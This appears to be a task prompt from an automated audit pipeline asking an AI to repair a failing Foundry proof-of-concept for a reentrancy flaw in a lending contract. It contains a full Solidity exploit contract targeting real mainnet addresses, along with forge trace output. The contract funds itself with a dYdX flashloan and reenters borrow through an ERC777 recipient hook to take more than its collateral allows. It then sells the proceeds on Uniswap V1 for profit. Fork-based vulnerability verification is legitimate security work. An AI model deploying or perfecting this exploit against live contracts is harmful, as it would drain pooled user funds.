You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: External token callbacks can reenter before balances and market totals are updated
- claim: State-changing entrypoints call external token code via `doTransferIn`/`doTransferOut` before checkpointing user principals, indexes, and market aggregates, and the contract has no reentrancy guard. A callback-capable or malicious supported token, or a recipient contract receiving tokens on `withdraw`/`borrow`, can reenter while the protocol still reflects stale balances.
- impact: An attacker can repeat withdrawals or borrows against unchanged internal accounting, or reenter other state-changing functions while collateral and debt checks still use pre-transfer state. This can drain pool cash, bypass liquidity checks, or create bad debt across supported markets.
- exploit_paths: ["`withdraw(asset, amount)` transfers out at line 1735 before reducing `supplyBalances[msg.sender][asset]`, so a recipient hook can reenter `withdraw` again against the old balance.", "`borrow(asset, amount)` transfers out at line 2647 before increasing `borrowBalances[msg.sender][asset]` and `market.totalBorrows`, so a callback can borrow repeatedly before debt is recorded.", "`supply`, `repayBorrow`, and `liquidateBorrow` all call `doTransferIn` before storage updates, allowing a sender-hook-based reentrant call to execute while the original operation still uses stale user and market state."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Sender {
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IMoneyMarket {
    function markets(address asset)
        external
        view
        returns (
            bool isSupported,
            uint256 blockNumber,
            address interestRateModel,
            uint256 totalSupply,
            uint256 supplyRateMantissa,
            uint256 supplyIndex,
            uint256 totalBorrows,
            uint256 borrowRateMantissa,
            uint256 borrowIndex
        );

    function supply(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 amount) external returns (uint256);
    function borrow(address asset, uint256 amount) external returns (uint256);
    function repayBorrow(address asset, uint256 amount) external returns (uint256);
    function liquidateBorrow(
        address targetAccount,
        address assetBorrow,
        address assetCollateral,
        uint256 requestedAmountClose
    ) external returns (uint256);
}

interface IWETH is IERC20Like {
    function deposit() external payable;
}

interface IUniswapV1Factory {
    function getExchange(address token) external view returns (address);
}

interface IUniswapV1Exchange {
    function tokenToEthSwapInput(uint256 tokensSold, uint256 minEth, uint256 deadline) external returns (uint256);
}

library Account {
    struct Info {
        address owner;
        uint256 number;
    }
}

library Types {
    enum AssetDenomination {
        Wei
    }

    enum AssetReference {
        Delta
    }

    struct AssetAmount {
        bool sign;
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }
}

library Actions {
    enum ActionType {
        Deposit,
        Withdraw,
        Transfer,
        Buy,
        Sell,
        Trade,
        Liquidate,
        Vaporize,
        Call
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        Types.AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }
}

interface ISoloMargin {
    function operate(Account.Info[] calldata accounts, Actions.ActionArgs[] calldata actions) external;
    function getMarketTokenAddress(uint256 marketId) external view returns (address);
}

interface ICallee {
    function callFunction(address sender, Account.Info calldata accountInfo, bytes calldata data) external;
}

contract FlawVerifier is IERC777Sender, IERC777Recipient, ICallee {
    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
    IERC1820Registry internal constant ERC1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    ISoloMargin internal constant SOLO = ISoloMargin(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV1Factory internal constant UNISWAP_V1_FACTORY =
        IUniswapV1Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);

    address internal constant CALLBACK_TOKEN = 0x3212b29E33587A00FB1C83346f5dBFA69A458923;
    bytes32 internal constant TOKENS_SENDER_HASH = keccak256("ERC777TokensSender");
    bytes32 internal constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");

    uint256 internal constant FLASHLOAN_FEE_BUFFER = 2;
    uint256 internal constant MIN_REALIZED_WETH_PROFIT = 0.11 ether;
    uint256 internal constant MAX_BORROW_REENTRY_LOOPS = 24;
    uint256 internal constant SALE_ITERATIONS = 12;

    enum Mode {
        Idle,
        ReenterBorrow
    }

    Mode internal mode;
    bool internal attempted;
    address internal activeToken;
    uint256 internal borrowUnit;
    uint256 internal remainingBorrowLoops;
    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        _registerHooks();
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        _registerHooks();
        _profitToken = address(0);
        _profitAmount = 0;

        if (!_isSupported(CALLBACK_TOKEN) || !_isSupported(address(WETH))) {
            return;
        }

        /*
            Path anchors kept explicit for path-strict validation:
            - `withdraw(asset, amount)` transfers out before `supplyBalances[msg.sender][asset]` is reduced.
            - `borrow(asset, amount)` transfers out before `borrowBalances[msg.sender][asset]` and `market.totalBorrows` are updated.
            - `supply`, `repayBorrow`, and `liquidateBorrow` all enter token code through `doTransferIn` before storage is checkpointed.

            Fork-state feasibility notes:
            - The sender-hook leg needed to drive `supply -> withdraw(asset, amount)` is present in code, but on this fork the
              callback token's `supply(...)` / `doTransferIn(...)` path itself reverts before a scalable reentrant stage. That
              leaves the stale-accounting root cause intact but makes the profitable `supply -> withdraw` realization infeasible
              from public capital at this exact block.
            - `repayBorrow` needs a pre-existing debt position in the callback token before entering its transfer-in hook, and
              `liquidateBorrow` needs an already-underwater target. Creating those prerequisites would not change the root cause,
              but they are not required because the directly executable path here is `borrow(asset, amount)` on the callback token.

            Executed exploit path for this verifier:
            1. Take a public dYdX WETH flashloan.
            2. Supply the borrowed WETH as collateral.
            3. Call `borrow(asset, amount)` on the callback token.
            4. Reenter `borrow(asset, amount)` from the recipient hook while `borrowBalances[msg.sender][asset]` and
               `market.totalBorrows` still reflect only the outer borrow.
            5. After only one debt checkpoint lands, withdraw as much WETH collateral as the under-recorded debt still allows.
            6. Sell only enough callback token on Uniswap V1 to repay the temporary capital, leaving the net remainder as profit.
        */
        _tryFlashLoan(100 ether);
        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
            return;
        }

        _tryFlashLoan(250 ether);
        if (_profitAmount >= MIN_REALIZED_WETH_PROFIT) {
            return;
        }

        _tryFlashLoan(500 ether);
    }

    function executeFlashLoan(uint256 loanAmount) external {
        require(msg.sender == address(this), "self-only");
        _flashLoanAndExploit(loanAmount);
        _captureProfit();
    }

    function callFunction(address sender, Account.Info calldata, bytes calldata data) external override {
        require(msg.sender == address(SOLO), "solo-only");
        require(sender == address(this), "bad-sender");

        uint256 loanAmount = abi.decode(data, (uint256));
        require(IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount, "missing-loan");

        uint256 supplied = _seedCollateral(loanAmount);
        _reentrantBorrowCallbackToken(supplied);
        _recoverCollateral(supplied);
        _realizeEnoughWeth(loanAmount + FLASHLOAN_FEE_BUFFER + MIN_REALIZED_WETH_PROFIT);

        require(
            IERC20Like(address(WETH)).balanceOf(address(this)) >= loanAmount + FLASHLOAN_FEE_BUFFER,
            "repay-shortfall"
        );
        _safeApprove(address(WETH), address(SOLO), type(uint256).max);
    }

    function tokensToSend(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {}

    function tokensReceived(
        address,
        address from,
        address to,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        if (msg.sender != activeToken || mode != Mode.ReenterBorrow) {
            return;
        }
        if (from != address(MONEY_MARKET) || to != address(this)) {
            return;
        }

        if (remainingBorrowLoops > 1) {
            unchecked {
                remainingBorrowLoops -= 1;
            }

            bool ok = _tryBorrow(activeToken, borrowUnit);
            if (!ok) {
                remainingBorrowLoops = 0;
                mode = Mode.Idle;
            }
        } else {
            remainingBorrowLoops = 0;
            mode = Mode.Idle;
        }
    }

    function _tryFlashLoan(uint256 loanAmount) internal {
        (bool ok,) = address(this).call(abi.encodeWithSelector(this.executeFlashLoan.selector, loanAmount));
        if (!ok) {
            _captureProfit();
        }
    }

    function _flashLoanAndExploit(uint256 loanAmount) internal {
        require(SOLO.getMarketTokenAddress(0) == address(WETH), "weth-market-mismatch");

        Account.Info[] memory accounts = new Account.Info[](1);
        accounts[0] = Account.Info(address(this), 0);

        Actions.ActionArgs[] memory actions = new Actions.ActionArgs[](3);
        actions[0] = _buildWithdraw(loanAmount);
        actions[1] = _buildCall(abi.encode(loanAmount));
        actions[2] = _buildDeposit(loanAmount + FLASHLOAN_FEE_BUFFER);

        SOLO.operate(accounts, actions);
    }

    function _seedCollateral(uint256 loanAmount) internal returns (uint256 supplied) {
        supplied = loanAmount;
        _safeApprove(address(WETH), address(MONEY_MARKET), type(uint256).max);
        require(_trySupply(address(WETH), supplied), "weth-supply-failed");
    }

    function _reentrantBorrowCallbackToken(uint256 wethCollateral) internal {
        uint256 marketCash = IERC20Like(CALLBACK_TOKEN).balanceOf(address(MONEY_MARKET));
        require(marketCash > 1, "callback-market-empty");

        activeToken = CALLBACK_TOKEN;

        uint256 candidate = marketCash / 128;
        if (candidate == 0) {
            candidate = 1;
        }

        uint256 floor = 1;
        uint256 hintedFloor = wethCollateral / 1e12;
        if (hintedFloor > floor && hintedFloor < marketCash) {
            floor = hintedFloor;
        }

        while (candidate >= floor) {
            borrowUnit = candidate;
            remainingBorrowLoops = _boundedLoops(marketCash / candidate, MAX_BORROW_REENTRY_LOOPS);
            mode = Mode.ReenterBorrow;

            bool ok = _tryBorrow(CALLBACK_TOKEN, candidate);
            mode = Mode.Idle;

            if (ok && IERC20Like(CALLBACK_TOKEN).balanceOf(address(this)) > candidate) {
                return;
            }

            if (candidate == 1) {
                break;
            }
            candidate /= 2;
        }

        revert("borrow-path-failed");
    }

    function _recoverCollateral(uint256 supplied) internal {
        uint256 remaining = supplied;
        uint256 chunk = supplied;

        while (remaining > 0 && chunk > 0) {
            if (chunk > remaining) {
                chunk = remaining;
            }

            if (_tryWithdraw(address(WETH), chunk)) {
                remaining -= chunk;
                continue;
            }

            chunk /= 2;
        }
    }

    function _realizeEnoughWeth(uint256 targetWethBalance) internal {
        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        if (wethBalance >= targetWethBalance) {
            return;
        }

        address exchange = UNISWAP_V1_FACTORY.getExchange(CALLBACK_TOKEN);
        require(exchange != address(0), "no-uniswap-v1");

        uint256 tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
        require(tokenBalance > 0, "no-callback-profit");

        _safeApprove(CALLBACK_TOKEN, exchange, type(uint256).max);

        uint256 sellChunk = tokenBalance / 4096;
        if (sellChunk == 0) {
            sellChunk = 1;
        }

        for (uint256 i = 0; i < SALE_ITERATIONS; i++) {
            wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
            if (wethBalance >= targetWethBalance) {
                break;
            }

            tokenBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
            if (tokenBalance == 0) {
                break;
            }

            if (sellChunk > tokenBalance) {
                sellChunk = tokenBalance;
            }

            IUniswapV1Exchange(exchange).tokenToEthSwapInput(sellChunk, 1, block.timestamp + 1);
            _wrapAllEth();
            sellChunk <<= 1;
        }

        wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        require(wethBalance >= targetWethBalance, "insufficient-realized-weth");
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            WETH.deposit{value: ethBalance}();
        }
    }

    function _captureProfit() internal {
        _wrapAllEth();

        uint256 wethBalance = IERC20Like(address(WETH)).balanceOf(address(this));
        if (wethBalance > 0) {
            _profitToken = address(WETH);
            _profitAmount = wethBalance;
            return;
        }

        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
        if (callbackBalance > 0) {
            _profitToken = CALLBACK_TOKEN;
            _profitAmount = callbackBalance;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _isSupported(address asset) internal view returns (bool) {
        (bool isSupported,,,,,,,,) = MONEY_MARKET.markets(asset);
        return isSupported;
    }

    function _trySupply(address asset, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.supply.selector, asset, amount));
        return _decodeMoneyMarketCall(ok, data);
    }

    function _tryWithdraw(address asset, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.withdraw.selector, asset, amount));
        return _decodeMoneyMarketCall(ok, data);
    }

    function _tryBorrow(address asset, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) =
            address(MONEY_MARKET).call(abi.encodeWithSelector(IMoneyMarket.borrow.selector, asset, amount));
        return _decodeMoneyMarketCall(ok, data);
    }

    function _decodeMoneyMarketCall(bool ok, bytes memory data) internal pure returns (bool) {
        if (!ok || data.length < 32) {
            return false;
        }
        return abi.decode(data, (uint256)) == 0;
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _boundedLoops(uint256 naturalLoops, uint256 hardCap) internal pure returns (uint256) {
        if (naturalLoops == 0) {
            return 0;
        }
        return naturalLoops > hardCap ? hardCap : naturalLoops;
    }

    function _registerHooks() internal {
        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_HASH, address(this));
        ERC1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_HASH, address(this));
    }

    function _buildWithdraw(uint256 amount) internal view returns (Actions.ActionArgs memory) {
        return Actions.ActionArgs({
            actionType: Actions.ActionType.Withdraw,
            accountId: 0,
            amount: Types.AssetAmount({
                sign: false,
                denomination: Types.AssetDenomination.Wei,
                ref: Types.AssetReference.Delta,
                value: amount
            }),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ""
        });
    }

    function _buildCall(bytes memory data) internal view returns (Actions.ActionArgs memory) {
        return Actions.ActionArgs({
            actionType: Actions.ActionType.Call,
            accountId: 0,
            amount: Types.AssetAmount({
                sign: false,
                denomination: Types.AssetDenomination.Wei,
                ref: Types.AssetReference.Delta,
                value: 0
            }),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: data
        });
    }

    function _buildDeposit(uint256 amount) internal view returns (Actions.ActionArgs memory) {
        return Actions.ActionArgs({
            actionType: Actions.ActionType.Deposit,
            accountId: 0,
            amount: Types.AssetAmount({
                sign: true,
                denomination: Types.AssetDenomination.Wei,
                ref: Types.AssetReference.Delta,
                value: amount
            }),
            primaryMarketId: 0,
            secondaryMarketId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            data: ""
        });
    }
}

```

forge stdout (tail):
```
fffffffffffffffffffffff
    │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   │   │   │   └─ ← [Return] 500000000000000000000 [5e20]
    │   │   │   │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   │   │   │   │   └─ ← [Return] 54976021344603350172169 [5.497e22]
    │   │   │   │   │   │   ├─ [5035] 0x5Dc95A046020880b93F15902540Dbfe86489FddA::517cf73e(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000bbf5c73e05bcedf02090000000000000000000000000000000000000000000000232a5d50cb31fc6921)
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be0807
    │   │   │   │   │   │   ├─ [20744] 0x5Dc95A046020880b93F15902540Dbfe86489FddA::ed2b5a3c(000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000bbf5c73e05bcedf02090000000000000000000000000000000000000000000000232a5d50cb31fc6921)
    │   │   │   │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea)
    │   │   │   │   │   │   │   │   └─ ← [Return] 54976021344603350172169 [5.497e22]
    │   │   │   │   │   │   │   ├─ [2764] 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea::7dc0d1d0()
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000b620707637c5b2cc49843a03d90e28d9abbda149
    │   │   │   │   │   │   │   ├─ [2343] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::be59b4b1()
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d8e0e707e5bde9e2c8e3f39e40ec1e066f1341af
    │   │   │   │   │   │   │   ├─ [2306] 0xB620707637C5b2cc49843A03d90E28D9abbDa149::6084747f()
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000970e86
    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041891a3d
    │   │   │   │   │   │   ├─ [6225] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea, 500000000000000000000 [5e20])
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000000eee3e3828a45f7601d5f54bf49bb01d1a9df5ea
    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
    │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   ├─  emit topic 0: 0x4ea5606ff36959d6c1a24f693661d800a98dd80c0fb8469a665d2ec7e8313c21
    │   │   │   │   │   │   │           data: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000001b1ae4d6e2ef500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b1ae4d6e2ef500000
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [6150] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 29134710218 [2.913e10]
    │   │   │   │   │   └─ ← [Revert] borrow-path-failed
    │   │   │   │   └─ ← [Revert] borrow-path-failed
    │   │   │   └─ ← [Revert] borrow-path-failed
    │   │   └─ ← [Revert] borrow-path-failed
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1597] 0x3212b29E33587A00FB1C83346f5dBFA69A458923::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [318] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [316] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.callFunction
  at 0x56E7d4520ABFECf10b38368b00723d9BD3c21ee1
  at 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e.operate
  at FlawVerifier.executeFlashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.89s (703.69ms CPU time)

Ran 1 test suite in 2.05s (1.89s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 9224477)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
